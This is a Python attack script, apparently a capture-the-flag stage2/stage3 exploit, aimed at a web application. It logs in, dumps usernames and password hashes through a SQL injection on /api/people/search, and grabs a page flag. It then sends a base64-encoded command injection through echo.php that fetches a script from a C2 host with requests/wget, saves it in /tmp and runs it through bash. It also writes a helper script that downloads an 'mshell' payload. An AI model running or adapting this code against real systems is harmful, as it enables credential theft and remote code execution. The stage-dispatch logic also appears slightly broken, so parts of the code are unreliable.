#!/usr/bin/env python3
############################################################
# This script utilizes the credentials discovered using
# stage1 to dump usernames and password hashes of users on 
# the target.  
#
# If "-a" is added to the arguments, the script will
# automatically save the information pulled down during
# the attack.
#
# After the information has been acquired by this script,
# the attacker must use a hash cracking tool to crack
# the password hashes pulled down.
#
# After cracking the hashes, the attacker can proceed to 
# the next stage of the attack.
############################################################
# Example Call:
# python3 stage2.py $TARGET user1 password1 -a
############################################################

import argparse
import base64
import json
import os
import platform
import re
import requests

ANSI_CLRLN = "\x1b[2K\r"
ANSI_CLRSC = "\x1b[2J\x1b[H"
ANSI_RST = "\x1b[0m"
ANSI_RED = "\x1b[31;1m"
ANSI_GRN = "\x1b[32;1m"
ANSI_YLW = "\x1b[33;1m"
ANSI_BLU = "\x1b[34;1m"

class attacker:
    def __init__(self, targetIP, username, password):
        self.baseURL = f"http://{targetIP}"
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.data = str()
        self.__timeout = 30
        return
    
    def grab_page_flag(self):
        flag = str()
        message = str()
        success = bool()

        try:
            SysMsgNB("Search for flag on homepage")

            flag_pattern = "fla.*{.*}"
            target = "index.php"
            fullURL = f"{self.baseURL}/{target}"

            resp = self.session.get(fullURL)
            if resp.status_code >= 400:
                raise requests.HTTPError(f"Bad Status Code ({resp.status_code} {resp.reason})")
            
            match = re.search(flag_pattern, resp.text)
            flag = resp.text[match.start():match.end()]
            message = "Page flag found."
            success = True
        except requests.Timeout:
            flag = None
            message = "Request timeout"
            success = False            
        except Exception as ex:
            flag = None
            message = str(ex)
            success = False

        return (flag, success, message)

    def login(self):
        loginURL = f"{self.baseURL}/login.php"
        dataDict = {"email": self.username, "password": self.password}

        try:
            SysMsgNB(f"Attempting login with \"{self.username}\" and \"{self.password}\"")
            resp = self.session.post(loginURL, dataDict, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")
            elif resp.content == b"\n\t\t":
                raise ValueError(f"Incorrect credentials.")
            
            message = "Login successful."
            success = True
        except requests.Timeout:
            message = "Request timeout"
            success = False
        except Exception as ex:
            message = str(ex)
            success = False
        return (success, message)
    
    def pull_script(self, c2, script):
        message = str()
        success = bool()

        try:
            target = "echo.php"
            fullURL = f"{self.baseURL}/{target}"

            pycmd = f"python3 -c \"import requests;r=requests.get(\'http://{c2}/{script}\');f=open(\'/tmp/script\',\'wb\');f.write(r.content);f.close()\""
            command = f"""{pycmd};chmod +x /tmp/script;/tmp/script"""
            if (len(command) % 3) != 0:
                pad = '%20' * (3 - len(command) % 3)
                command = f"{command}{pad}"
            command = base64.b64encode(command.encode()).decode()
            command = command.strip("=")
            SysMsgNB("command built & encoded")
            payload = f"""{command} | base64 -d | bash"""
            payload = payload.replace(" ", "+").replace("|","%7C")
            SysMsgNB("payload successfully created")
            fullURL = f"{fullURL}?search={payload}"

            SysMsgNB("sending malicious payload to target")
            resp = self.session.get(fullURL, timeout=self.__timeout, allow_redirects=True)
            if resp.status_code >= 400:
                raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")
            
            message = "Exploit complete"
            success = True
        except requests.Timeout:
            message = "timeout detected. reverse shell could be executing"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False
        return (success, message)
    
    def save_data(self, outfile=None):
        if (outfile is None) or not(isinstance(outfile,str)):
            outfile = "extracted_data"
        
        try:
            SysMsgNB(f"Writing extracted data to \"{outfile}\"")
            with open(outfile, "wb") as fptr:
                if isinstance(self.data,str):
                    bytes_written = fptr.write(f"{self.data}\n".encode())
                elif isinstance(self.data,list) or isinstance(self.data,set):
                    bytes_written = int()
                    for extracted_line in self.data:
                        bytes_written += fptr.write(f"{str(extracted_line)}\n".encode())
                elif isinstance(self.data,dict):
                    bytes_written = int()
                    for k,v in self.data.items():
                        bytes_written += fptr.write(f"{k}:{v}\n".encode())
                else:
                    ErrMsg(f"Unknown Data Type ({type(self.data)})")
            message = f"{bytes_written} bytes writen to \"{outfile}\""
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)
    
    def sqli_attack(self, autosave=None):
        if (autosave is None) and not(isinstance(autosave,bool)):
            autosave = False

        vulnURL = f"{self.baseURL}/api/people/search"
        sqli = "x' OR 1=1 OR permissionPeople = 'admin"
        dataDict = {"namePeople": sqli}

        try:
            SysMsgNB("Attempting SQLi")
            resp = self.session.post(vulnURL, data=dataDict, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")
            elif resp.content == b"\n\t\t":
                raise ValueError("Could Not Perform SQLi")
        
            self.data = json.loads(resp.content)[0]
            if autosave:
                success, message = self.save_data()
                if success:
                    SucMsg(message)
                else:
                    ErrMsg(message)

            message = "SQLi successful"
            success = True
        except Exception as ex:
            self.data = None
            message = str(ex)
            success = False

        return (self.data, success, message)

def InfMsg(msg):
    if not(isinstance(msg,str)):
        msg = str(msg)    
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}")
    return

def SucMsg(msg):
    if not(isinstance(msg,str)):
        msg = str(msg)    
    print(f"{ANSI_CLRLN}[{ANSI_GRN}+{ANSI_RST}] {msg}")
    return

def ErrMsg(msg):
    if not(isinstance(msg,str)):
        msg = str(msg)    
    print(f"{ANSI_CLRLN}[{ANSI_RED}-{ANSI_RST}] {msg}")
    return

def SysMsg(msg):
    if not(isinstance(msg,str)):
        msg = str(msg)    
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}")
    return

def InfMsgNB(msg):
    if not(isinstance(msg,str)):
        msg = str(msg)    
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}", end="")
    return

def SysMsgNB(msg):
    if not(isinstance(msg,str)):
        msg = str(msg)    
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}", end="")
    return

def create_script(name, c2IP):
    message = str()
    success = bool()
    try:
        c2server = f"http://{c2IP}"
        content = f"""#!/bin/bash\nwget -O /timers/timer.sh {c2server}/mshell\nchmod +x /timers/timer.sh"""
        with open(name, "w") as fptr:
            fptr.write(content)
        message = "Script created."
        success = True
    except Exception as ex:
        message = str(ex)
        success = False
    return (success, message)

def main():
    if platform.system().lower() == "windows":
        os.system("")

    parser = argparse.ArgumentParser()
    parser.add_argument("targetIP", help="IP address of target", type=str)
    parser.add_argument("username", help="user to login as", type=str)
    parser.add_argument("password", help="password to login with", type=str)

    subparser = parser.add_subparsers(help="stage command", dest="stage")

    stage2 = subparser.add_parser("stage2", help="stage2 help")
    stage2.add_argument("-a","--autosave", help="autosave credentials to local file", default=False, action="store_true")

    stage3 = subparser.add_parser("stage3", help="stage3 help")
    stage3.add_argument("-b", help="create exploit script on local machine", default=False, action="store_true", dest="build")    
    stage3.add_argument("-c", help="C2 server IP", default="127.0.0.1", dest="c2ip", type=str)
    stage3.add_argument("-s", help="shell script to pull down", default="rooter.sh", dest="script", type=str)

    args = parser.parse_args()
    targetIP = args.targetIP
    username = args.username
    password = args.password

    attackStage = args.stage

    try:
        a = attacker(targetIP, username, password)
        success, message = a.login()
        if not(success):
            raise ValueError(message)
        SucMsg(message)

        if attackStage == 2:
            autosave = args.autosave
            data, success, message = a.sqli_attack(autosave=autosave)
            if not(success):
                raise ValueError(message)
            SucMsg(message)

            for cred in data:
                SucMsg(f"{cred['namePeople']}:{cred['passwordPeople']:}")
        else:
            build = args.build
            c2ip = args.c2ip
            script = args.script

            if build:
                create_script(script, c2ip)

            flag, success, message = a.grab_page_flag()
            if not(success):
                raise ValueError(message)
            SucMsg(f"Flag Found: {flag}")

            success, message = a.pull_script(c2ip, script)
            if not(success):
                raise ValueError(message)
            SucMsg(message)
    except Exception as ex:
        ErrMsg(str(ex))
        exit(1)

    return

if __name__ == "__main__":
    main()
